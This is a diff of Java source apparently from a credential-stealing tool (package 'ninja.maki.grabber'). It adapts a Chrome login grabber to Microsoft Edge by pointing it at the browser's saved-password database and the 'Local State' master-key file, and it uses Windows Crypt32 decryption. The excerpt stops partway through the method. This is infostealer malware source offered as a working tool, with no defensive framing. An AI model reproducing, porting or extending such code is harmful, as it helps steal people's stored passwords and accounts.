@@ -1,4 +1,4 @@
-package ninja.maki.grabber.chrome;
+package ninja.maki.grabber.edge;
 
 import com.sun.jna.platform.win32.Crypt32Util;
 import ninja.maki.utils.SystemUtil;
@@ -15,14 +15,14 @@ import java.sql.ResultSet;
 import java.sql.Statement;
 import java.util.Arrays;
 
-public class ChromeLogin {
+public class EdgeLogin {
     public static void grab() {
         SystemUtil.console();
-        String loginTemp = System.getProperty("java.io.tmpdir") + "chromelogindata.tmp";
-        String loginPath = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+        String loginTemp = System.getProperty("java.io.tmpdir") + "edgelogindata.tmp";
+        String loginPath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
         File loginTempFile = new File(loginTemp);
         try {
-            loginTempFile = File.createTempFile("chromelogindata", ".tmp");
+            loginTempFile = File.createTempFile("edgelogindata", ".tmp");
             loginTemp = loginTempFile.getAbsolutePath();
         }catch (IOException e){
             SystemUtil.console("Failed to create temp file.");
@@ -30,7 +30,7 @@ public class ChromeLogin {
         File loginPathFile = new File(loginPath);
         if(loginPathFile.exists()) {
             try {
-                String loginState = System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
+                String loginState = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
                 File loginStateFile = new File(loginState);
                 StringBuilder cryptMasterKey = new StringBuilder();
                 try (BufferedReader reader = new BufferedReader(new FileReader(loginStateFile))) {
